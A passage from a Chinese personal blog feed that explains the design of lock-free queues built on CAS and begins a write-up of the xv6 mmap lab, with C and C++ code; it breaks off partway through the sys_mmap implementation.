c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (yqueue.<span class="hljs-built_in">read</span>(&amp;value)) &#123;<br>    <span class="hljs-comment">// 具体处理逻辑</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 获得锁，然后通过条件变量阻塞自己</span><br>    std::unique_lock&lt;std::mutex&gt; <span class="hljs-built_in">lock</span>(ypipe_mutex_);<br>    ypipe_cond_.<span class="hljs-built_in">wait</span>(lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>阻塞一直到写进程写入数据，通过条件变量唤醒阻塞的读进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">yqueue.<span class="hljs-built_in">write</span>(count, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!yqueue.<span class="hljs-built_in">flush</span>()) &#123;<br>    <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(ypipe_mutex_)</span></span>;<br>    ypipe_cond_.<span class="hljs-built_in">notify_one</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="w-r-f-c详解"><a href="#w-r-f-c详解" class="headerlink" title="w,r,f,c详解"></a>w,r,f,c详解</h3><p>首先看看在各个函数中，哪些指针被使用了</p><h4 id="ypipe-t"><a href="#ypipe-t" class="headerlink" title="ypipe_t"></a>ypipe_t</h4><p>在初始化函数中</p><ol><li>首先对队列调用一个push，为back赋予一个正常的值（这里面，在使用的时候，back永远指向一个空的位置，即可以直接赋值）</li><li>然后将四个指针都置为back</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">ypipe_t</span><span class="hljs-params">()</span> </span>&#123;<br>    queue.<span class="hljs-built_in">push</span>();<br>    r = w = f = &amp;queue.<span class="hljs-built_in">back</span>(); <br>    c.<span class="hljs-built_in">set</span>(&amp;queue.<span class="hljs-built_in">back</span>());<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><ol><li><p>将一个值直接写到队列中。这里也证实了back就是指向一个空的位置，每次使用时，直接赋值然后++</p></li><li><p>重头戏来了，这里首次更新指针<code>f</code></p><p>如果这是这次写的最后一个（生产者可以一次性写一大堆数据），那么就会更新f指向当前队列的最后一个元素。待会在flush的时候会用上它</p></li></ol><p>这里是使用了一种机制，使得写操作不会马上呈现在消费者眼中，只会在生产者调用了flush之后消费者才能看到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp;value_, <span class="hljs-type">bool</span> incomplete_)</span> </span>&#123;<br>    queue.<span class="hljs-built_in">back</span>() = value_;<br>    queue.<span class="hljs-built_in">push</span>();<br>    <span class="hljs-keyword">if</span> (!incomplete_) &#123;<br>        f = &amp;queue.<span class="hljs-built_in">back</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="flush"><a href="#flush" class="headerlink" title="flush"></a>flush</h4><ol><li>如果w和f相同，说明没有需要flush的，直接返回true</li><li>比较c和w的值<ol><li>无论如何都会将c和w更新为f</li><li>如果c和w的值不同，c只可能是null，说明读线程被阻塞了，返回一个false提醒写线程唤醒读线程</li></ol></li></ol><p>flush函数的作用</p><ol><li>更新c和w，以告诉读线程，现在有新的数据可读</li><li>根据返回值告诉写线程读线程是否被阻塞了</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">flush</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (w == f) <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (c.<span class="hljs-built_in">cas</span>(w, f) != w) <br>    &#123;<br>        c.<span class="hljs-built_in">set</span>(f);<br>        w = f;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        w = f;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p>对于读线程</p><ol><li>通过check_read判断是否可读，不可读的话直接返回不可读</li><li>可读的话直接开读</li></ol><p>因此关键在于check_read函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">read</span><span class="hljs-params">(T *value_)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">check_read</span>())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    *value_ = queue.<span class="hljs-built_in">front</span>();<br>    queue.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="check-read"><a href="#check-read" class="headerlink" title="check_read"></a>check_read</h4><ol><li>如果r指针有效，并且它不是front，即现在还有可读的数据，那么返回true，直接读</li><li>如果目前r指针不对劲，那么尝试更新r指针为c（如果现在有可读的数据，即生产者调用了flush，那c一定是最新的可读的边界）<ol><li>如果c也是队列头，说明现在根本就没数据，因此将c置为NULL</li><li>如果c不是队列头，那么不会改变c</li></ol></li><li>判断更新之后的r是否有效并且不是队列头，如果不满足的话，返回false，否则返回true</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">check_read</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (&amp;queue.<span class="hljs-built_in">front</span>() != r &amp;&amp; r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    r = c.<span class="hljs-built_in">cas</span>(&amp;queue.<span class="hljs-built_in">front</span>(), <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (&amp;queue.<span class="hljs-built_in">front</span>() == r || !r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="整体思路梳理（单读单写）"><a href="#整体思路梳理（单读单写）" class="headerlink" title="整体思路梳理（单读单写）"></a>整体思路梳理（单读单写）</h1><p>现在有一个队列，一个生产者和一个消费者</p><p>传统的思路就是用一把大锁，谁要用队列就直接锁上，这样一定会保证线程安全，但是这样太慢了</p><p>先尝试这样的优化思路</p><ol><li>生产者维护一个下标w，指向它生产到了哪里</li><li>消费者维护一个下标r，指向它可以一直读到哪个下标为止</li></ol><p>比如有个队列长为10，如果w&#x3D;5，r&#x3D;3</p><p>r&#x3D;3则表示消费者可以一直读到下标3处为止，比如1,2,3它都可以读</p><p>w&#x3D;5则表示，现在1,2,3,4,5都有东西可读</p><p>之所以w和r不一样，是因为w和r是分别存在于生产者和消费者线程内的，互相不可见，这样就不会有竞争条件</p><p>但是这样虽然没竞争，但是w和r肯定是要同步的，要不然消费者咋知道生产者生产了多少东西</p><p>既然要进行线程间的同步，那肯定要用到锁了。无锁队列采用的是CAS机制。首先全局有一个生产者和消费者都可以操作的变量c</p><ol><li>在生产者生产了一个东西放入队列后，它可以通过变量c的CAS机制将新的下标更新到c中。因为CAS机制，所以一定是线程安全的</li><li>在消费者发现自己已经读到了下标r后，它会试着用变量c的CAS机制来更新下标r，如果有更新，说明有新的可读，否则的话说明没东西读了</li></ol><p>因此，通过变量c，就可以将w和r联系起来，并且一定保证线程安全</p><p>但是还可以继续优化，如果频繁调用CAS机制，那可能还是比较耗费资源</p><ol><li>在生产者端，写入数据后，可以不急着更新到c中，等到写入一定量的数据后，再更新到c中，这样可以避免频繁调用CAS，并且这样一次就可以更新多个值，消费者那边效率也高些，不会说取一个就没了</li><li>在消费者端，其实已经是优化过的思路了，即r指针代表的是可以读到的位置，假如r等于5，而我们目前只读到2，那可以啥也不管地一直读3个，直到读到了r，这时候才需要考虑更新r</li></ol><p>在具体的实现中，还有一个f指针，主要是用于代码实现的，理解思路跟它没啥关系</p><p>至此，又优化了一波。还可以继续优化吗？</p><p>接下来可以从底层数据结构的角度进行优化</p><ol><li>首先，为了避免频繁调用malloc（除了系统调用的开销，它还会阻塞一个进程内的所有线程），可以一次分配一个N个元素的大块。并且可以缓存一个空闲的块，不马上销毁，也可以提升性能</li><li>其次，考虑到一个块太大了浪费，太小了不够用，可以以链表的形式将多个块串起来，这样就可以避免数组带来的连续空间的问题了</li></ol><h1 id="无锁队列的实现（多读多写）"><a href="#无锁队列的实现（多读多写）" class="headerlink" title="无锁队列的实现（多读多写）"></a>无锁队列的实现（多读多写）</h1><p>之前分析的单写单读无锁队列由于没有对w和r加锁，因此只能用于一个生产者一个消费者的情况。</p><h2 id="ArrayLockFreeQueue"><a href="#ArrayLockFreeQueue" class="headerlink" title="ArrayLockFreeQueue"></a>ArrayLockFreeQueue</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> ELEM_T, QUEUE_INT Q_SIZE = ARRAY_LOCK_FREE_Q_DEFAULT_SIZE&gt;<br><span class="hljs-keyword">class</span> ArrayLockFreeQueue &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">ArrayLockFreeQueue</span>();<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">ArrayLockFreeQueue</span>();<br>    <span class="hljs-function">QUEUE_INT <span class="hljs-title">size</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">// 入队</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">enqueue</span><span class="hljs-params">(<span class="hljs-type">const</span> ELEM_T &amp;a_data)</span></span>;<br>    <span class="hljs-comment">// 出队</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">dequeue</span><span class="hljs-params">(ELEM_T &amp;a_data)</span></span>;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// 环形数组</span><br>    ELEM_T m_thequeue[Q_SIZE];<br>    <span class="hljs-comment">// 队列内待处理的元素数量</span><br>    <span class="hljs-keyword">volatile</span> QUEUE_INT m_count;<br>    <span class="hljs-comment">// 写坐标</span><br>    <span class="hljs-keyword">volatile</span> QUEUE_INT m_writeIndex;<br>    <span class="hljs-comment">// 读坐标</span><br>    <span class="hljs-keyword">volatile</span> QUEUE_INT m_readIndex;<br>    <span class="hljs-comment">// 最大的可读位置的坐标</span><br>    <span class="hljs-keyword">volatile</span> QUEUE_INT m_maximumReadIndex;<br>    <span class="hljs-comment">// 取余函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> QUEUE_INT <span class="hljs-title">countToIndex</span><span class="hljs-params">(QUEUE_INT a_count)</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>需要注意的是，m_maximumReadIndex不一定和m_writeIndex同步，因为申请空间后就会更新writeindex，但只有在数据写入之后，才会更新m_maximumReadIndex</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="取余函数"><a href="#取余函数" class="headerlink" title="取余函数"></a>取余函数</h3><p>循环队列，因此肯定要有取余的操作，直接mod数组的长度Q_SIZE即可</p><p>队列已满的判断条件：(write+1)%size&#x3D;&#x3D;read%size</p><p>队列为空的判断条件：write%size&#x3D;&#x3D;read%size</p><h3 id="入队函数enqueue"><a href="#入队函数enqueue" class="headerlink" title="入队函数enqueue"></a>入队函数enqueue</h3><ol><li>首先判断队列是否已经满了（获取全局的读和写指针），如果已经满了，直接返回false</li><li>如果队列有空位，尝试将写指针+1，如果失败，则回到第1步重新循环</li><li>如果写指针增加成功，那么将值写入更新前的位置（写指针指向的是空闲位置，更新之后，相当于指向的是下一次写的空闲位置）</li><li>最后尝试更新read最多可读到的位置，如果更新失败，则阻塞后再循环（这里有个很奇妙的地方，只有在read最多可读的位置的指针和当前指针相同时，才会将它更新到+1，这样就保证了这个值一定是一点一点地加1，不会出现多个线程乱操作的情况）</li></ol><p>总结来说，CAS很奇妙，使用它不仅是保证这次一定只有一个线程能访问到它正确的值，更是通过它和之前的值进行比较，保证了一定只有某个线程可以更新它</p><p>所以，使用CAS之前，应该拿到一个旧值，这样相当于一个通行证，只有它才能使用CAS更新某个变量为新值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> ELEM_T, QUEUE_INT Q_SIZE&gt;<br><span class="hljs-type">bool</span> ArrayLockFreeQueue&lt;ELEM_T, Q_SIZE&gt;::<span class="hljs-built_in">enqueue</span>(<span class="hljs-type">const</span> ELEM_T &amp;a_data) &#123;<br>    QUEUE_INT currentWriteIndex;<br>    QUEUE_INT currentReadIndex;<br>    <span class="hljs-keyword">do</span> &#123;<br>        currentWriteIndex = m_writeIndex;<br>        currentReadIndex = m_readIndex;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">countToIndex</span>(currentWriteIndex + <span class="hljs-number">1</span>) ==<br>            <span class="hljs-built_in">countToIndex</span>(currentReadIndex)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">CAS</span>(&amp;m_writeIndex, currentWriteIndex, (currentWriteIndex + <span class="hljs-number">1</span>)));<br>    m_thequeue[<span class="hljs-built_in">countToIndex</span>(currentWriteIndex)] = a_data;<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">CAS</span>(&amp;m_maximumReadIndex, currentWriteIndex, (currentWriteIndex + <span class="hljs-number">1</span>))) &#123;<br>        <span class="hljs-built_in">sched_yield</span>();<br>    &#125;<br>    <span class="hljs-built_in">AtomicAdd</span>(&amp;m_count, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="出队函数dequeue"><a href="#出队函数dequeue" class="headerlink" title="出队函数dequeue"></a>出队函数dequeue</h3><ol><li>先判断当前队列是否为空，如果空的话，直接返回false了。这里可能不太严谨，因为可能刚取完read和max的值，这两个值就被更新了，但是没关系，大不了再调用一次</li><li>取出队头的值，但是这不代表它正确取出了，原因如上所说，可能刚取完read和max的下标，这个下标就已经被别人修改了</li><li>如果现在全局的read指针和自己的指针相同，这才说明这个值应该是由自己取出来，否则的话说明已经被别人给取了</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> ELEM_T, QUEUE_INT Q_SIZE&gt;<br><span class="hljs-type">bool</span> ArrayLockFreeQueue&lt;ELEM_T, Q_SIZE&gt;::<span class="hljs-built_in">dequeue</span>(ELEM_T &amp;a_data) &#123;<br>    QUEUE_INT currentMaximumReadIndex;<br>    QUEUE_INT currentReadIndex;<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        currentReadIndex = m_readIndex;<br>        currentMaximumReadIndex = m_maximumReadIndex;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">countToIndex</span>(currentReadIndex) ==<br>            <span class="hljs-built_in">countToIndex</span>(currentMaximumReadIndex))    <br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        a_data = m_thequeue[<span class="hljs-built_in">countToIndex</span>(currentReadIndex)]; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">CAS</span>(&amp;m_readIndex, currentReadIndex, (currentReadIndex + <span class="hljs-number">1</span>))) &#123;<br>            <span class="hljs-built_in">AtomicSub</span>(&amp;m_count, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="多读多写的机制总结"><a href="#多读多写的机制总结" class="headerlink" title="多读多写的机制总结"></a>多读多写的机制总结</h3><p>多读多写可以说就是在读层面和写层使用了同一个思想</p><ol><li>先建立一个所有线程共享的下标值</li><li>在每个线程试图去操作的时候，先取出当前的下标值，然后判断队空或者队满</li><li>如果自己可以操作的话，通过CAS判断目前这个点是否轮到自己操作了，即没有被其他线程抢先操作完了<ol><li>对于写线程来说，检查write的下标是否和自己记录的一样，一样的话，说明可以操作，否则循环重新去取下一个吧，这个已经被别人处理了</li><li>对于读线程来说也是这样，检查现在read的下标是否和自己记录的一样</li><li>当然了，对于写线程来说，它还需要多一个更新可读的最大下标的任务，同样是判断是否应该是自己操作。具体实现上通过之前记录的write下标即可</li></ol></li></ol><p>这里有个小坑，就是因为是循环数组，因此如果存的是智能指针，可能不会自动释放</p><h2 id="yield的重要性"><a href="#yield的重要性" class="headerlink" title="yield的重要性"></a>yield的重要性</h2><p>明明说是无锁队列，为什么还要用yield放弃cpu主动阻塞呢？</p><p>因为如果不主动让出cpu，当前线程可能会因为CAS操作失败而不断循环，即空转cpu，这种情况下，还不如让出cpu。</p><p>如果只有一个生产者，那么当然不需要yield，也不可能运行到yield语句，但是如果有很多个生产者，就需要考虑了。</p><h1 id="总结-致谢"><a href="#总结-致谢" class="headerlink" title="总结&amp;致谢"></a>总结&amp;致谢</h1><p>无锁队列不是真的无锁，而是将锁的粒度设置地特别小，使得并发的性能尽量高。但是好像它只是在并发量特别高的时候才有很好的性能，普通情况下可能还不如直接用锁来的方便，所以还是要依据具体情况选择。</p><p>在科软的第一个学期已经要结束了，这学期的课基本也都上完了。只能说孟宁老师的《网络程序设计》真绝世好课，原因如下</p><ol><li>可以学到东西：几次实验包括了的epoll，grpc框架和消息队列，以及linux内核协议栈的调试（gcc调试方法）</li><li>课程内容也不会脱离找工作找实习：第1点里提到的基本都是C++面试必问的。有些课程虽然也能学到东西，但是对于找实习找工作，性价比太低</li><li>平时作业很轻松：以学到东西为主，没有很严格的考核机制</li><li>最后的大作业的自由度很高，可以借此机会选择自己感兴趣的方向深入学习一下</li></ol><p>最后，借此机会还搭建了个人博客，只能说，绝世好课！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>lab10</title>
    <link href="/2023/12/20/lab10%20mmap/"/>
    <url>/2023/12/20/lab10%20mmap/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231220221050424.png" alt="image-20231220221050424"></p><ul><li><a href="#task">task</a></li><li><a href="#hints">hints</a></li><li><a href="#%E6%80%9D%E8%B7%AF">思路</a><ul><li><a href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E7%BD%AE">基础设置</a></li><li><a href="#%E5%A2%9E%E5%8A%A0%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">增加数据结构</a></li><li><a href="#sys_mmap">sys_mmap</a></li><li><a href="#usertrap">usertrap</a></li><li><a href="#munmap">munmap</a></li><li><a href="#exit">exit</a></li><li><a href="#fork">fork</a></li></ul></li></ul><h1 id="task"><a href="#task" class="headerlink" title="task"></a>task</h1><hr><p>mmap的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">           <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><ol><li><p>在这个lab中，addr永远为0，即内核决定用哪个虚拟地址去映射这个文件，mmap返回这个虚拟地址，或者0xffffffffffffffff 表示失败</p></li><li><p>length代表映射的字节数量，不一定要是文件的长度</p></li><li><p>prot决定了这个内存，可读，可写或者可执行</p><p> 具体的宏为PROT_READ、PROT_WRITE</p></li><li><p>flags如果是MAP_SHARED，意味着对内存的修改要写回到文件</p><p> MAP_PRIVATE意味着不用写回文件</p></li><li><p>fd是文件的描述符，你可以假设offset是0</p></li></ol><hr><p>munmap的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">munmap(addr, length)<br></code></pre></td></tr></table></figure><ol><li>munmap应该移出这些地址范围内的映射</li><li>如果进程修改了内存，并且映射方式是MAP_SHARED，那么修改应该被写回文件</li><li>munmap可能只覆盖了mmap的一部分区间，可以是开始，可以是末尾，也可能是整个，但不会是中间位置</li></ol><h1 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h1><ol><li><p>首先在Makefile中添加_mmaptest，并且增加mmap和munmap系统调用</p><p> 在<code>kernel/fcntl.h</code>为你定义了<code>PROT_READ</code>等参数</p></li><li><p>lazy地对待页表，类似于lazy lab。</p><p> 即mmap并不会直接分配物理内存和读文件，在usertrap中处理页错误时再真正的分配内存</p></li><li><p>你需要记录每个进程通过mmap映射了什么</p><p> 你可以定义一个和VMA相关的数据结构，去记录地址，长度，权限，文件等</p><p> 你可以定义一个固定长度的VMA数组，16就足够了</p></li><li><p>实现mmap</p><ol><li><p>在进程的地址空间找一块未使用的区域去映射文件</p></li><li><p>并且增加一个VMA到进程映射区域的表中</p><ol><li>VMA应该包含一个指向<code>struct file</code>的指针。mmap应该增加这个文件的引用，这一部分可以参考<code>filedup</code></li></ol></li><li><p>这时候运行mmaptest，可以发现第一个成功了，但是后面的还是失败了</p></li></ol></li><li><p>增加代码</p><ol><li>在页错误发生在mapped区域时，分配一个物理页面，从相关的文件中读取4096个字节，并且将其映射到用户地址空间</li><li>用readi读取文件，它会使用到一个offset参数，同时你需要将inode结点给lock和unlock</li><li>不要忘记设置这一页的权限位</li><li>运行mmaptest，这时候会运行到munmap了</li></ol></li><li><p>实现munmap</p><ol><li>找到这个地址范围内的VMA，unmap指定的页面，使用<code>uvmunmap</code></li><li>如果munmap删除了mmap分配的所有区域，那它应该减少文件的引用次数</li><li>如果一个页面是MAP_SHARED，并且被修改了，那么应该写回文件（学习<code>filewrite</code>）。写回时不需要管pte的dirty位</li></ol></li><li><p>修改exit函数，使其能够在进程用过mmap的情况下，将没有被munmap都处理掉，至此mmap_test可能可以通过了</p></li><li><p>修改fork保证孩子也有和父节点一样的映射区域，不要忘记了去给VMA文件增加引用数。在页错误发生时，可以分配一个新的物理页面，而不是和父进程共享一个。</p></li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h2><p>首先需要修改Makefile并且添加两个系统调用，这个就比较简单了</p><h2 id="增加数据结构"><a href="#增加数据结构" class="headerlink" title="增加数据结构"></a>增加数据结构</h2><p>我们应该按照hints提示的，创造一个VMA的结构体，并且在进程的proc的结构体中存储一个VMA的数组。这里的思路就比较简单暴力了，就只维护一个数组，需要用的时候就遍历数组去找就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> &#123;</span><br>    uint64 addr;<br>    <span class="hljs-type">int</span> length;<br>    <span class="hljs-type">int</span> prot;<br>    <span class="hljs-type">int</span> flag;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-type">int</span> valid;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma</span> <span class="hljs-title">vmas</span>[16];</span><br>    <span class="hljs-comment">//.......</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sys-mmap"><a href="#sys-mmap" class="headerlink" title="sys_mmap"></a>sys_mmap</h2><p>开始写<code>mmap</code>函数</p><ol><li>这玩意的作用就是只申请一个虚拟地址空间，但是不直接分配物理地址。在申请完之后，就将相关的东西存在proc的VMA数组中去</li><li>有几个情况需要特判<ol><li>如果文件不可读，那么就不能用<code>MAP_SHARED</code>，因为这种模式在之后会写入到磁盘</li><li>地址不够了，即<code>p-&gt;sz&gt;MAXVA</code></li></ol></li><li>注意点<ol><li>只分配虚拟内存，不增加物理内存，就是通过只增加<code>p-&gt;sz</code>而不真正的映射实现的。包括页表中都没有相关的记录</li><li>用<code>argfd</code>取出文件指针</li><li>记得用<code>filedup</code>增加文件的引用计数</li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_mmap</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    uint64 addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span 